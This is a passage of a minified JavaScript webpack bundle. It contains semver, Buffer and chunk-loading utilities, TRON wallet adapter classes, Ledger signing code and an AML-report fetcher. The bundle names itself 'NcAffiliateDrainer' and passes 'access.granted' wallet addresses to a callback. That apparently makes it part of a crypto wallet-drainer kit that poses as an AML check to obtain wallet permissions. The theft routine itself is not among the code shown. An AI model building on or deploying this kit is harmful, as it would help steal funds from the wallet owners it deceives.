            }, RangeError),
            P("ERR_INVALID_ARG_TYPE", function(t, e) {
                return `The "${t}" argument must be of type number. Received type ${typeof e}`
            }, TypeError),
            P("ERR_OUT_OF_RANGE", function(t, e, n) {
                let r = `The value of "${t}" is out of range.`
                  , i = n;
                return Number.isInteger(n) && Math.abs(n) > 2 ** 32 ? i = F(String(n)) : "bigint" == typeof n && (i = String(n),
                (n > BigInt(2) ** BigInt(32) || n < -(BigInt(2) ** BigInt(32))) && (i = F(i)),
                i += "n"),
                r += ` It must be ${e}. Received ${i}`,
                r
            }, RangeError);
            const Y = /[^+/0-9A-Za-z-_]/g;
            function G(t, e) {
                let n;
                e = e || 1 / 0;
                const r = t.length;
                let i = null;
                const o = [];
                for (let s = 0; s < r; ++s) {
                    if (n = t.charCodeAt(s),
                    n > 55295 && n < 57344) {
                        if (!i) {
                            if (n > 56319) {
                                (e -= 3) > -1 && o.push(239, 191, 189);
                                continue
                            }
                            if (s + 1 === r) {
                                (e -= 3) > -1 && o.push(239, 191, 189);
                                continue
                            }
                            i = n;
                            continue
                        }
                        if (n < 56320) {
                            (e -= 3) > -1 && o.push(239, 191, 189),
                            i = n;
                            continue
                        }
                        n = 65536 + (i - 55296 << 10 | n - 56320)
                    } else
                        i && (e -= 3) > -1 && o.push(239, 191, 189);
                    if (i = null,
                    n < 128) {
                        if ((e -= 1) < 0)
                            break;
                        o.push(n)
                    } else if (n < 2048) {
                        if ((e -= 2) < 0)
                            break;
                        o.push(n >> 6 | 192, 63 & n | 128)
                    } else if (n < 65536) {
                        if ((e -= 3) < 0)
                            break;
                        o.push(n >> 12 | 224, n >> 6 & 63 | 128, 63 & n | 128)
                    } else {
                        if (!(n < 1114112))
                            throw new Error("Invalid code point");
                        if ((e -= 4) < 0)
                            break;
                        o.push(n >> 18 | 240, n >> 12 & 63 | 128, n >> 6 & 63 | 128, 63 & n | 128)
                    }
                }
                return o
            }
            function Z(t) {
                return r.toByteArray(function(t) {
                    if ((t = (t = t.split("=")[0]).trim().replace(Y, "")).length < 2)
                        return "";
                    for (; t.length % 4 != 0; )
                        t += "=";
                    return t
                }(t))
            }
            function H(t, e, n, r) {
                let i;
                for (i = 0; i < r && !(i + n >= e.length || i >= t.length); ++i)
                    e[i + n] = t[i];
                return i
            }
            function J(t, e) {
                return t instanceof e || null != t && null != t.constructor && null != t.constructor.name && t.constructor.name === e.name
            }
            function X(t) {
                return t != t
            }
            const q = function() {
                const t = "0123456789abcdef"
                  , e = new Array(256);
                for (let n = 0; n < 16; ++n) {
                    const r = 16 * n;
                    for (let i = 0; i < 16; ++i)
                        e[r + i] = t[n] + t[i]
                }
                return e
            }();
            function K(t) {
                return "undefined" == typeof BigInt ? $ : t
            }
            function $() {
                throw new Error("BigInt not supported")
            }
        },
        8311(t, e, n) {
            const r = /\s+/g;
            class i {
                constructor(t, e) {
                    if (e = s(e),
                    t instanceof i)
                        return t.loose === !!e.loose && t.includePrerelease === !!e.includePrerelease ? t : new i(t.raw,e);
                    if (t instanceof a)
                        return this.raw = t.value,
                        this.set = [[t]],
                        this.formatted = void 0,
                        this;
                    if (this.options = e,
                    this.loose = !!e.loose,
                    this.includePrerelease = !!e.includePrerelease,
                    this.raw = t.trim().replace(r, " "),
                    this.set = this.raw.split("||").map(t => this.parseRange(t.trim())).filter(t => t.length),
                    !this.set.length)
                        throw new TypeError(`Invalid SemVer Range: ${this.raw}`);
                    if (this.set.length > 1) {
                        const t = this.set[0];
                        if (this.set = this.set.filter(t => !m(t[0])),
                        0 === this.set.length)
                            this.set = [t];
                        else if (this.set.length > 1)
                            for (const t of this.set)
                                if (1 === t.length && y(t[0])) {
                                    this.set = [t];
                                    break
                                }
                    }
                    this.formatted = void 0
                }
                get range() {
                    if (void 0 === this.formatted) {
                        this.formatted = "";
                        for (let t = 0; t < this.set.length; t++) {
                            t > 0 && (this.formatted += "||");
                            const e = this.set[t];
                            for (let t = 0; t < e.length; t++)
                                t > 0 && (this.formatted += " "),
                                this.formatted += e[t].toString().trim()
                        }
                    }
                    return this.formatted
                }
                format() {
                    return this.range
                }
                toString() {
                    return this.range
                }
                parseRange(t) {
                    const e = ((this.options.includePrerelease && g) | (this.options.loose && w)) + ":" + t
                      , n = o.get(e);
                    if (n)
                        return n;
                    const r = this.options.loose
                      , i = r ? d[h.HYPHENRANGELOOSE] : d[h.HYPHENRANGE];
                    t = t.replace(i, k(this.options.includePrerelease)),
                    c("hyphen replace", t),
                    t = t.replace(d[h.COMPARATORTRIM], u),
                    c("comparator trim", t),
                    t = t.replace(d[h.TILDETRIM], f),
                    c("tilde trim", t),
                    t = t.replace(d[h.CARETTRIM], p),
                    c("caret trim", t);
                    let s = t.split(" ").map(t => M(t, this.options)).join(" ").split(/\s+/).map(t => D(t, this.options));
                    r && (s = s.filter(t => (c("loose invalid filter", t, this.options),
                    !!t.match(d[h.COMPARATORLOOSE])))),
                    c("range list", s);
                    const l = new Map
                      , y = s.map(t => new a(t,this.options));
                    for (const t of y) {
                        if (m(t))
                            return [t];
                        l.set(t.value, t)
                    }
                    l.size > 1 && l.has("") && l.delete("");
                    const v = [...l.values()];
                    return o.set(e, v),
                    v
                }
                intersects(t, e) {
                    if (!(t instanceof i))
                        throw new TypeError("a Range is required");
                    return this.set.some(n => v(n, e) && t.set.some(t => v(t, e) && n.every(n => t.every(t => n.intersects(t, e)))))
                }
                test(t) {
                    if (!t)
                        return !1;
                    if ("string" == typeof t)
                        try {
                            t = new l(t,this.options)
                        } catch (t) {
                            return !1
                        }
                    for (let e = 0; e < this.set.length; e++)
                        if (L(this.set[e], t, this.options))
                            return !0;
                    return !1
                }
            }
            t.exports = i;
            const o = new (n(8794))
              , s = n(8587)
              , a = n(3904)
              , c = n(7272)
              , l = n(3908)
              , {safeRe: d, t: h, comparatorTrimReplace: u, tildeTrimReplace: f, caretTrimReplace: p} = n(9718)
              , {FLAG_INCLUDE_PRERELEASE: g, FLAG_LOOSE: w} = n(6874)
              , m = t => "<0.0.0-0" === t.value
              , y = t => "" === t.value
              , v = (t, e) => {
                let n = !0;
                const r = t.slice();
                let i = r.pop();
                for (; n && r.length; )
                    n = r.every(t => i.intersects(t, e)),
                    i = r.pop();
                return n
            }
              , M = (t, e) => (c("comp", t, e),
            t = A(t, e),
            c("caret", t),
            t = I(t, e),
            c("tildes", t),
            t = _(t, e),
            c("xrange", t),
            t = x(t, e),
            c("stars", t),
            t)
              , N = t => !t || "x" === t.toLowerCase() || "*" === t
              , I = (t, e) => t.trim().split(/\s+/).map(t => E(t, e)).join(" ")
              , E = (t, e) => {
                const n = e.loose ? d[h.TILDELOOSE] : d[h.TILDE];
                return t.replace(n, (e, n, r, i, o) => {
                    let s;
                    return c("tilde", t, e, n, r, i, o),
                    N(n) ? s = "" : N(r) ? s = `>=${n}.0.0 <${+n + 1}.0.0-0` : N(i) ? s = `>=${n}.${r}.0 <${n}.${+r + 1}.0-0` : o ? (c("replaceTilde pr", o),
                    s = `>=${n}.${r}.${i}-${o} <${n}.${+r + 1}.0-0`) : s = `>=${n}.${r}.${i} <${n}.${+r + 1}.0-0`,
                    c("tilde return", s),
                    s
                }
                )
            }
              , A = (t, e) => t.trim().split(/\s+/).map(t => b(t, e)).join(" ")
              , b = (t, e) => {
                c("caret", t, e);
                const n = e.loose ? d[h.CARETLOOSE] : d[h.CARET]
                  , r = e.includePrerelease ? "-0" : "";
                return t.replace(n, (e, n, i, o, s) => {
                    let a;
                    return c("caret", t, e, n, i, o, s),
                    N(n) ? a = "" : N(i) ? a = `>=${n}.0.0${r} <${+n + 1}.0.0-0` : N(o) ? a = "0" === n ? `>=${n}.${i}.0${r} <${n}.${+i + 1}.0-0` : `>=${n}.${i}.0${r} <${+n + 1}.0.0-0` : s ? (c("replaceCaret pr", s),
                    a = "0" === n ? "0" === i ? `>=${n}.${i}.${o}-${s} <${n}.${i}.${+o + 1}-0` : `>=${n}.${i}.${o}-${s} <${n}.${+i + 1}.0-0` : `>=${n}.${i}.${o}-${s} <${+n + 1}.0.0-0`) : (c("no pr"),
                    a = "0" === n ? "0" === i ? `>=${n}.${i}.${o}${r} <${n}.${i}.${+o + 1}-0` : `>=${n}.${i}.${o}${r} <${n}.${+i + 1}.0-0` : `>=${n}.${i}.${o} <${+n + 1}.0.0-0`),
                    c("caret return", a),
                    a
                }
                )
            }
              , _ = (t, e) => (c("replaceXRanges", t, e),
            t.split(/\s+/).map(t => T(t, e)).join(" "))
              , T = (t, e) => {
                t = t.trim();
                const n = e.loose ? d[h.XRANGELOOSE] : d[h.XRANGE];
                return t.replace(n, (n, r, i, o, s, a) => {
                    c("xRange", t, n, r, i, o, s, a);
                    const l = N(i)
                      , d = l || N(o)
                      , h = d || N(s)
                      , u = h;
                    return "=" === r && u && (r = ""),
                    a = e.includePrerelease ? "-0" : "",
                    l ? n = ">" === r || "<" === r ? "<0.0.0-0" : "*" : r && u ? (d && (o = 0),
                    s = 0,
                    ">" === r ? (r = ">=",
                    d ? (i = +i + 1,
                    o = 0,
                    s = 0) : (o = +o + 1,
                    s = 0)) : "<=" === r && (r = "<",
                    d ? i = +i + 1 : o = +o + 1),
                    "<" === r && (a = "-0"),
                    n = `${r + i}.${o}.${s}${a}`) : d ? n = `>=${i}.0.0${a} <${+i + 1}.0.0-0` : h && (n = `>=${i}.${o}.0${a} <${i}.${+o + 1}.0-0`),
                    c("xRange return", n),
                    n
                }
                )
            }
              , x = (t, e) => (c("replaceStars", t, e),
            t.trim().replace(d[h.STAR], ""))
              , D = (t, e) => (c("replaceGTE0", t, e),
            t.trim().replace(d[e.includePrerelease ? h.GTE0PRE : h.GTE0], ""))
              , k = t => (e, n, r, i, o, s, a, c, l, d, h, u) => `${n = N(r) ? "" : N(i) ? `>=${r}.0.0${t ? "-0" : ""}` : N(o) ? `>=${r}.${i}.0${t ? "-0" : ""}` : s ? `>=${n}` : `>=${n}${t ? "-0" : ""}`} ${c = N(l) ? "" : N(d) ? `<${+l + 1}.0.0-0` : N(h) ? `<${l}.${+d + 1}.0-0` : u ? `<=${l}.${d}.${h}-${u}` : t ? `<${l}.${d}.${+h + 1}-0` : `<=${c}`}`.trim()
              , L = (t, e, n) => {
                for (let n = 0; n < t.length; n++)
                    if (!t[n].test(e))
                        return !1;
                if (e.prerelease.length && !n.includePrerelease) {
                    for (let n = 0; n < t.length; n++)
                        if (c(t[n].semver),
                        t[n].semver !== a.ANY && t[n].semver.prerelease.length > 0) {
                            const r = t[n].semver;
                            if (r.major === e.major && r.minor === e.minor && r.patch === e.patch)
                                return !0
                        }
                    return !1
                }
                return !0
            }
        },
        8587(t) {
            const e = Object.freeze({
                loose: !0
            })
              , n = Object.freeze({});
            t.exports = t => t ? "object" != typeof t ? e : t : n
        },
        8714(t) {
            class e {
                constructor(t) {
                    this.type = "wc.uri.generated",
                    this.uri = t
                }
                toJSON() {
                    return {
                        type: this.type,
                        uri: this.uri
                    }
                }
                static fromJSON(t) {
                    return new e(t.uri)
                }
            }
            class n {
                constructor(t, e=null) {
                    this.type = "modal.show",
                    this.id = t,
                    this.modalType = e
                }
                toJSON() {
                    return {
                        type: this.type,
                        id: this.id,
                        modal_type: this.modalType
                    }
                }
                static fromJSON(t) {
                    return new n(t.id,t.modal_type)
                }
            }
            class r {
                constructor(t) {
                    this.type = "access.granted",
                    this.address = t
                }
                toJSON() {
                    return {
                        type: this.type,
                        address: this.address
                    }
                }
                static fromJSON(t) {
                    return new r(t.address)
                }
            }
            t.exports = {
                WcUriGeneratedMessageDTO: e,
                ModalShowMessageDTO: n,
                AccessGrantedMessageDTO: r
            }
        },
        8794(t) {
            t.exports = class {
                constructor() {
                    this.max = 1e3,
                    this.map = new Map
                }
                get(t) {
                    const e = this.map.get(t);
                    return void 0 === e ? void 0 : (this.map.delete(t),
                    this.map.set(t, e),
                    e)
                }
                delete(t) {
                    return this.map.delete(t)
                }
                set(t, e) {
                    if (!this.delete(t) && void 0 !== e) {
                        if (this.map.size >= this.max) {
                            const t = this.map.keys().next().value;
                            this.delete(t)
                        }
                        this.map.set(t, e)
                    }
                    return this
                }
            }
        },
        9502(t, e, n) {
            const {BASE_URL: r} = n(5477)
              , {InternalServiceError: i, ValidationError: o, NetworkError: s} = n(8013)
              , {AmlReportDTO: a} = n(6701)
              , c = {
                getAMLReport: async t => {
                    try {
                        const e = await fetch(`${r}/aml-report/${t}`, {
                            method: "GET",
                            headers: {
                                "Content-Type": "application/json"
                            }
                        })
                          , n = await async function(t, e) {
                            try {
                                if (!t.ok) {
                                    let n = null;
                                    try {
                                        n = await t.json()
                                    } catch (t) {
                                        console.warn(`${e}: Could not parse error response as JSON:`, t)
                                    }
                                    const r = n?.error || `HTTP ${t.status}: ${t.statusText}`;
                                    switch (t.status) {
                                    case 400:
                                        throw new o(r);
                                    case 404:
                                        throw new o("Resource not found");
                                    case 500:
                                        throw new i(r);
                                    default:
                                        throw new Error(r)
                                    }
                                }
                                return await t.json()
                            } catch (t) {
                                if (t instanceof i || t instanceof o)
                                    throw t;
                                throw console.error(`${e}: Network or parsing error:`, t),
                                new s(`Failed to ${e.toLowerCase()}: ${t.message}`,t)
                            }
                        }(e, "Get AML Report");
                        return new a(n)
                    } catch (t) {
                        throw console.error("Get AML report failed:", t),
                        t
                    }
                }
            };
            t.exports = {
                amlReportServiceAdapter: c,
                InternalServiceError: i,
                ValidationError: o,
                NetworkError: s
            }
        },
        9589(t, e, n) {
            const r = n(9718)
              , i = n(6874)
              , o = n(3908)
              , s = n(1123)
              , a = n(144)
              , c = n(6953)
              , l = n(7414)
              , d = n(3007)
              , h = n(1832)
              , u = n(2938)
              , f = n(6254)
              , p = n(4493)
              , g = n(1729)
              , w = n(560)
              , m = n(9970)
              , y = n(1763)
              , v = n(909)
              , M = n(3927)
              , N = n(4277)
              , I = n(5580)
              , E = n(7059)
              , A = n(4641)
              , b = n(3999)
              , _ = n(4089)
              , T = n(5200)
              , x = n(2111)
              , D = n(6170)
              , k = n(3904)
              , L = n(8311)
              , S = n(7638)
              , C = n(7631)
              , j = n(9628)
              , O = n(270)
              , U = n(1261)
              , W = n(3874)
              , z = n(7075)
              , R = n(5571)
              , P = n(5342)
              , F = n(6780)
              , B = n(2525)
              , V = n(5032);
            t.exports = {
                parse: a,
                valid: c,
                clean: l,
                inc: d,
                diff: h,
                major: u,
                minor: f,
                patch: p,
                prerelease: g,
                compare: w,
                rcompare: m,
                compareLoose: y,
                compareBuild: v,
                sort: M,
                rsort: N,
                gt: I,
                lt: E,
                eq: A,
                neq: b,
                gte: _,
                lte: T,
                cmp: x,
                coerce: D,
                Comparator: k,
                Range: L,
                satisfies: S,
                toComparators: C,
                maxSatisfying: j,
                minSatisfying: O,
                minVersion: U,
                validRange: W,
                outside: z,
                gtr: R,
                ltr: P,
                intersects: F,
                simplifyRange: B,
                subset: V,
                SemVer: o,
                re: r.re,
                src: r.src,
                tokens: r.t,
                SEMVER_SPEC_VERSION: i.SEMVER_SPEC_VERSION,
                RELEASE_TYPES: i.RELEASE_TYPES,
                compareIdentifiers: s.compareIdentifiers,
                rcompareIdentifiers: s.rcompareIdentifiers
            }
        },
        9628(t, e, n) {
            const r = n(3908)
              , i = n(8311);
            t.exports = (t, e, n) => {
                let o = null
                  , s = null
                  , a = null;
                try {
                    a = new i(e,n)
                } catch (t) {
                    return null
                }
                return t.forEach(t => {
                    a.test(t) && (o && -1 !== s.compare(t) || (o = t,
                    s = new r(o,n)))
                }
                ),
                o
            }
        },
        9718(t, e, n) {
            const {MAX_SAFE_COMPONENT_LENGTH: r, MAX_SAFE_BUILD_LENGTH: i, MAX_LENGTH: o} = n(6874)
              , s = n(7272)
              , a = (e = t.exports = {}).re = []
              , c = e.safeRe = []
              , l = e.src = []
              , d = e.safeSrc = []
              , h = e.t = {};
            let u = 0;
            const f = "[a-zA-Z0-9-]"
              , p = [["\\s", 1], ["\\d", o], [f, i]]
              , g = (t, e, n) => {
                const r = (t => {
                    for (const [e,n] of p)
                        t = t.split(`${e}*`).join(`${e}{0,${n}}`).split(`${e}+`).join(`${e}{1,${n}}`);
                    return t
                }
                )(e)
                  , i = u++;
                s(t, i, e),
                h[t] = i,
                l[i] = e,
                d[i] = r,
                a[i] = new RegExp(e,n ? "g" : void 0),
                c[i] = new RegExp(r,n ? "g" : void 0)
            }
            ;
            g("NUMERICIDENTIFIER", "0|[1-9]\\d*"),
            g("NUMERICIDENTIFIERLOOSE", "\\d+"),
            g("NONNUMERICIDENTIFIER", `\\d*[a-zA-Z-]${f}*`),
            g("MAINVERSION", `(${l[h.NUMERICIDENTIFIER]})\\.(${l[h.NUMERICIDENTIFIER]})\\.(${l[h.NUMERICIDENTIFIER]})`),
            g("MAINVERSIONLOOSE", `(${l[h.NUMERICIDENTIFIERLOOSE]})\\.(${l[h.NUMERICIDENTIFIERLOOSE]})\\.(${l[h.NUMERICIDENTIFIERLOOSE]})`),
            g("PRERELEASEIDENTIFIER", `(?:${l[h.NUMERICIDENTIFIER]}|${l[h.NONNUMERICIDENTIFIER]})`),
            g("PRERELEASEIDENTIFIERLOOSE", `(?:${l[h.NUMERICIDENTIFIERLOOSE]}|${l[h.NONNUMERICIDENTIFIER]})`),
            g("PRERELEASE", `(?:-(${l[h.PRERELEASEIDENTIFIER]}(?:\\.${l[h.PRERELEASEIDENTIFIER]})*))`),
            g("PRERELEASELOOSE", `(?:-?(${l[h.PRERELEASEIDENTIFIERLOOSE]}(?:\\.${l[h.PRERELEASEIDENTIFIERLOOSE]})*))`),
            g("BUILDIDENTIFIER", `${f}+`),
            g("BUILD", `(?:\\+(${l[h.BUILDIDENTIFIER]}(?:\\.${l[h.BUILDIDENTIFIER]})*))`),
            g("FULLPLAIN", `v?${l[h.MAINVERSION]}${l[h.PRERELEASE]}?${l[h.BUILD]}?`),
            g("FULL", `^${l[h.FULLPLAIN]}$`),
            g("LOOSEPLAIN", `[v=\\s]*${l[h.MAINVERSIONLOOSE]}${l[h.PRERELEASELOOSE]}?${l[h.BUILD]}?`),
            g("LOOSE", `^${l[h.LOOSEPLAIN]}$`),
            g("GTLT", "((?:<|>)?=?)"),
            g("XRANGEIDENTIFIERLOOSE", `${l[h.NUMERICIDENTIFIERLOOSE]}|x|X|\\*`),
            g("XRANGEIDENTIFIER", `${l[h.NUMERICIDENTIFIER]}|x|X|\\*`),
            g("XRANGEPLAIN", `[v=\\s]*(${l[h.XRANGEIDENTIFIER]})(?:\\.(${l[h.XRANGEIDENTIFIER]})(?:\\.(${l[h.XRANGEIDENTIFIER]})(?:${l[h.PRERELEASE]})?${l[h.BUILD]}?)?)?`),
            g("XRANGEPLAINLOOSE", `[v=\\s]*(${l[h.XRANGEIDENTIFIERLOOSE]})(?:\\.(${l[h.XRANGEIDENTIFIERLOOSE]})(?:\\.(${l[h.XRANGEIDENTIFIERLOOSE]})(?:${l[h.PRERELEASELOOSE]})?${l[h.BUILD]}?)?)?`),
            g("XRANGE", `^${l[h.GTLT]}\\s*${l[h.XRANGEPLAIN]}$`),
            g("XRANGELOOSE", `^${l[h.GTLT]}\\s*${l[h.XRANGEPLAINLOOSE]}$`),
            g("COERCEPLAIN", `(^|[^\\d])(\\d{1,${r}})(?:\\.(\\d{1,${r}}))?(?:\\.(\\d{1,${r}}))?`),
            g("COERCE", `${l[h.COERCEPLAIN]}(?:$|[^\\d])`),
            g("COERCEFULL", l[h.COERCEPLAIN] + `(?:${l[h.PRERELEASE]})?` + `(?:${l[h.BUILD]})?(?:$|[^\\d])`),
            g("COERCERTL", l[h.COERCE], !0),
            g("COERCERTLFULL", l[h.COERCEFULL], !0),
            g("LONETILDE", "(?:~>?)"),
            g("TILDETRIM", `(\\s*)${l[h.LONETILDE]}\\s+`, !0),
            e.tildeTrimReplace = "$1~",
            g("TILDE", `^${l[h.LONETILDE]}${l[h.XRANGEPLAIN]}$`),
            g("TILDELOOSE", `^${l[h.LONETILDE]}${l[h.XRANGEPLAINLOOSE]}$`),
            g("LONECARET", "(?:\\^)"),
            g("CARETTRIM", `(\\s*)${l[h.LONECARET]}\\s+`, !0),
            e.caretTrimReplace = "$1^",
            g("CARET", `^${l[h.LONECARET]}${l[h.XRANGEPLAIN]}$`),
            g("CARETLOOSE", `^${l[h.LONECARET]}${l[h.XRANGEPLAINLOOSE]}$`),
            g("COMPARATORLOOSE", `^${l[h.GTLT]}\\s*(${l[h.LOOSEPLAIN]})$|^$`),
            g("COMPARATOR", `^${l[h.GTLT]}\\s*(${l[h.FULLPLAIN]})$|^$`),
            g("COMPARATORTRIM", `(\\s*)${l[h.GTLT]}\\s*(${l[h.LOOSEPLAIN]}|${l[h.XRANGEPLAIN]})`, !0),
            e.comparatorTrimReplace = "$1$2$3",
            g("HYPHENRANGE", `^\\s*(${l[h.XRANGEPLAIN]})\\s+-\\s+(${l[h.XRANGEPLAIN]})\\s*$`),
            g("HYPHENRANGELOOSE", `^\\s*(${l[h.XRANGEPLAINLOOSE]})\\s+-\\s+(${l[h.XRANGEPLAINLOOSE]})\\s*$`),
            g("STAR", "(<|>)?=?\\s*\\*"),
            g("GTE0", "^\\s*>=\\s*0\\.0\\.0\\s*$"),
            g("GTE0PRE", "^\\s*>=\\s*0\\.0\\.0-0\\s*$")
        },
        9970(t, e, n) {
            const r = n(560);
            t.exports = (t, e, n) => r(e, t, n)
        }
    }, r = {};
    function i(t) {
        var e = r[t];
        if (void 0 !== e)
            return e.exports;
        var o = r[t] = {
            exports: {}
        };
        return n[t](o, o.exports, i),
        o.exports
    }
    i.m = n,
    i.n = t => {
        var e = t && t.__esModule ? () => t.default : () => t;
        return i.d(e, {
            a: e
        }),
        e
    }
    ,
    i.d = (t, e) => {
        for (var n in e)
            i.o(e, n) && !i.o(t, n) && Object.defineProperty(t, n, {
                enumerable: !0,
                get: e[n]
            })
    }
    ,
    i.f = {},
    i.e = t => Promise.all(Object.keys(i.f).reduce( (e, n) => (i.f[n](t, e),
    e), [])),
    i.u = t => t + ".bundle.js",
    i.g = function() {
        if ("object" == typeof globalThis)
            return globalThis;
        try {
            return this || new Function("return this")()
        } catch (t) {
            if ("object" == typeof window)
                return window
        }
    }(),
    i.o = (t, e) => Object.prototype.hasOwnProperty.call(t, e),
    t = {},
    e = "NcAffiliateDrainer:",
    i.l = (n, r, o, s) => {
        if (t[n])
            t[n].push(r);
        else {
            var a, c;
            if (void 0 !== o)
                for (var l = document.getElementsByTagName("script"), d = 0; d < l.length; d++) {
                    var h = l[d];
                    if (h.getAttribute("src") == n || h.getAttribute("data-webpack") == e + o) {
                        a = h;
                        break
                    }
                }
            a || (c = !0,
            (a = document.createElement("script")).charset = "utf-8",
            i.nc && a.setAttribute("nonce", i.nc),
            a.setAttribute("data-webpack", e + o),
            a.src = n),
            t[n] = [r];
            var u = (e, r) => {
                a.onerror = a.onload = null,
                clearTimeout(f);
                var i = t[n];
                if (delete t[n],
                a.parentNode && a.parentNode.removeChild(a),
                i && i.forEach(t => t(r)),
                e)
                    return e(r)
            }
              , f = setTimeout(u.bind(null, void 0, {
                type: "timeout",
                target: a
            }), 12e4);
            a.onerror = u.bind(null, a.onerror),
            a.onload = u.bind(null, a.onload),
            c && document.head.appendChild(a)
        }
    }
    ,
    i.r = t => {
        "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(t, Symbol.toStringTag, {
            value: "Module"
        }),
        Object.defineProperty(t, "__esModule", {
            value: !0
        })
    }
    ,
    ( () => {
        var t;
        i.g.importScripts && (t = i.g.location + "");
        var e = i.g.document;
        if (!t && e && (e.currentScript && "SCRIPT" === e.currentScript.tagName.toUpperCase() && (t = e.currentScript.src),
        !t)) {
            var n = e.getElementsByTagName("script");
            if (n.length)
                for (var r = n.length - 1; r > -1 && (!t || !/^http(s?):/.test(t)); )
                    t = n[r--].src
        }
        if (!t)
            throw new Error("Automatic publicPath is not supported in this browser");
        t = t.replace(/^blob:/, "").replace(/#.*$/, "").replace(/\?.*$/, "").replace(/\/[^\/]+$/, "/"),
        i.p = t
    }
    )(),
    ( () => {
        var t = {
            792: 0
        };
        i.f.j = (e, n) => {
            var r = i.o(t, e) ? t[e] : void 0;
            if (0 !== r)
                if (r)
                    n.push(r[2]);
                else {
                    var o = new Promise( (n, i) => r = t[e] = [n, i]);
                    n.push(r[2] = o);
                    var s = i.p + i.u(e)
                      , a = new Error;
                    i.l(s, n => {
                        if (i.o(t, e) && (0 !== (r = t[e]) && (t[e] = void 0),
                        r)) {
                            var o = n && ("load" === n.type ? "missing" : n.type)
                              , s = n && n.target && n.target.src;
                            a.message = "Loading chunk " + e + " failed.\n(" + o + ": " + s + ")",
                            a.name = "ChunkLoadError",
                            a.type = o,
                            a.request = s,
                            r[1](a)
                        }
                    }
                    , "chunk-" + e, e)
                }
        }
        ;
        var e = (e, n) => {
            var r, o, [s,a,c] = n, l = 0;
            if (s.some(e => 0 !== t[e])) {
                for (r in a)
                    i.o(a, r) && (i.m[r] = a[r]);
                c && c(i)
            }
            for (e && e(n); l < s.length; l++)
                o = s[l],
                i.o(t, o) && t[o] && t[o][0](),
                t[o] = 0
        }
          , n = this.webpackChunkNcAffiliateDrainer = this.webpackChunkNcAffiliateDrainer || [];
        n.forEach(e.bind(null, 0)),
        n.push = e.bind(null, n.push.bind(n))
    }
    )();
    var o = {};
    return ( () => {
        "use strict";
        i.r(o),
        i.d(o, {
            NcAffiliateTronModal: () => n.NcAffiliateTronModal,
            getAMLReport: () => $n,
            getAccessGrantedCallback: () => er,
            openModal: () => Kn,
            setAccessGrantedCallback: () => tr
        });
        var t = i(9502)
          , e = i(5093)
          , n = i(7614)
          , r = i(753)
          , s = i(8287);
        "undefined" != typeof window && void 0 === window.Buffer && (window.Buffer = s.hp);
        var a, c, l = i(228);
        !function(t) {
            t.Loading = "Loading",
            t.NotFound = "NotFound",
            t.Found = "Found"
        }(a || (a = {})),
        function(t) {
            t.Loading = "Loading",
            t.NotFound = "NotFound",
            t.Disconnect = "Disconnected",
            t.Connected = "Connected"
        }(c || (c = {}));
        class d extends l {
            get connected() {
                return this.state === c.Connected
            }
            disconnect() {
                return console.info("The current adapter doesn't support disconnect by DApp."),
                Promise.resolve()
            }
            multiSign(...t) {
                return Promise.reject("The current wallet doesn't support multiSign.")
            }
            switchChain(t) {
                return Promise.reject("The current wallet doesn't support switch chain.")
            }
        }
        function h() {
            return "undefined" != typeof window && "undefined" != typeof document && "undefined" != typeof navigator
        }
        function u() {
            return "undefined" != typeof navigator && navigator.userAgent.match(/Android|webOS|iPhone|iPad|iPod|BlackBerry|Windows Phone/i)
        }
        class f extends Error {
            constructor(t, e) {
                super(t),
                this.error = e
            }
        }
        class p extends f {
            constructor() {
                super(...arguments),
                this.name = "WalletNotFoundError",
                this.message = "The wallet is not found."
            }
        }
        class g extends f {
            constructor() {
                super(...arguments),
                this.name = "WalletDisconnectedError",
                this.message = "The wallet is disconnected. Please connect first."
            }
        }
        class w extends f {
            constructor() {
                super(...arguments),
                this.name = "WalletConnectionError"
            }
        }
        class m extends f {
            constructor() {
                super(...arguments),
                this.name = "WalletDisconnectionError"
            }
        }
        class y extends f {
            constructor() {
                super(...arguments),
                this.name = "WalletSignMessageError"
            }
        }
        class v extends f {
            constructor() {
                super(...arguments),
                this.name = "WalletSignTransactionError"
            }
        }
        class M extends f {
            constructor() {
                super(...arguments),
                this.name = "WalletSwitchChainError"
            }
        }
        class N extends f {
            constructor() {
                super(...arguments),
                this.name = "WalletGetNetworkError"
            }
        }
        function I(t) {
            const e = [];
            return t.split("/").forEach(t => {
                let n = parseInt(t, 10);
                isNaN(n) || (t.length > 1 && "'" === t[t.length - 1] && (n += 2147483648),
                e.push(n))
            }
            ),
            e
        }
        function E(t, e) {
            function n(t, r, i) {
                return t >= r.length ? i : e(r[t], t).then(function(e) {
                    return i.push(e),
                    n(t + 1, r, i)
                })
            }
            return Promise.resolve().then( () => n(0, t, []))
        }
        function A(t, e) {
            let n = 0
              , r = 0
              , i = e;
            for (; r < 64; ) {
                const e = t[i];
                if (n |= (127 & e) << r,
                i += 1,
                !(128 & e))
                    return n &= 4294967295,
                    {
                        value: n,
                        pos: i
                    };
                r += 7
            }
            throw new Error("Too many bytes when decoding varint.")
        }
        function b(t) {
            const e = t.startsWith("0x") ? t.slice(2) : t;
            return Buffer.from((t => t.length % 2 ? "0" + t : t)(e), "hex")
        }
        const _ = 224;
        class T {
            transport;
            constructor(t, e="TRX") {
                this.transport = t,
                t.decorateAppAPIMethods(this, ["getAddress", "getECDHPairKey", "signTransaction", "signTransactionHash", "signPersonalMessage", "signTIP712HashedMessage", "getAppConfiguration"], e)
            }
            getAddress(t, e) {
                const n = I(t)
                  , r = Buffer.alloc(1 + 4 * n.length);
                return r[0] = n.length,
                n.forEach( (t, e) => {
                    r.writeUInt32BE(t, 1 + 4 * e)
                }
                ),
                this.transport.send(_, 2, e ? 1 : 0, 0, r).then(t => {
                    const e = t[0]
                      , n = t[1 + e];
                    return {
                        publicKey: t.slice(1, 1 + e).toString("hex"),
                        address: t.slice(1 + e + 1, 1 + e + 1 + n).toString("ascii")
                    }
                }
                )
            }
            getNextLength(t) {
                const e = A(t, 0)
                  , n = A(t, e.pos);
                return 7 & e.value ? n.value + n.pos : n.pos
            }
            signTransaction(t, e, n) {
                const r = I(t);
                let i = Buffer.from(e, "hex");
                const o = [];
                let s = Buffer.alloc(1 + 4 * r.length);
                for (s[0] = r.length,
                r.forEach( (t, e) => {
                    s.writeUInt32BE(t, 1 + 4 * e)
                }
                ); i.length > 0; ) {
                    const t = this.getNextLength(i);
                    if (t > 250)
                        throw new Error("Too many bytes to encode.");
                    s.length + t > 250 ? (o.push(s),
                    s = Buffer.alloc(0)) : (s = Buffer.concat([s, i.slice(0, t)]),
